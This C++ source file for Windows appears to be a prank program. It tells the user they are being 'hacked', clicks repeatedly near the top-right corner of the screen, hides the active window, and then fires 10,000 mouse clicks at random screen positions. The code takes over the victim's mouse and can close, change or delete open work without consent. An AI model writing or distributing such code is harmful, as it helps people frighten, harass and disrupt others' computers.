#include <iostream>
#include <windows.h> 
using namespace std; 
int main()
{ 
    cout<<"You will be hacked in 2 seconds"<<endl;
	Sleep(2000);
	cout<<"You are HACKED"<<endl;
	Sleep(1000);
	for(int i=0;i<20;++i)
	{
	    SetCursorPos(1330,10);
		mouse_event(MOUSEEVENTF_LEFTDOWN,1330,10,0,0);
		mouse_event(MOUSEEVENTF_LEFTUP,1330,10,0,0);
		Sleep(100);
	}    
	cout<<"Ha ha ha!!!"<<endl;
	Sleep(1000);
	HWND foreground=GetForegroundWindow();
	ShowWindow(foreground,SW_HIDE);
    int x,y;
	for(int i=0;i<10000;i++)
	{
	x=rand()%1000;
	y=rand()%800;
	SetCursorPos(x,y); //move cursor to random position
	mouse_event(MOUSEEVENTF_LEFTDOWN,x,y,0,0); //click
	mouse_event(MOUSEEVENTF_LEFTDOWN,x,y,0,0); //click
	mouse_event(MOUSEEVENTF_LEFTUP,x,y,0,0); //click
	mouse_event(MOUSEEVENTF_LEFTUP,x,y,0,0); //click
	}
	return 0;
	}
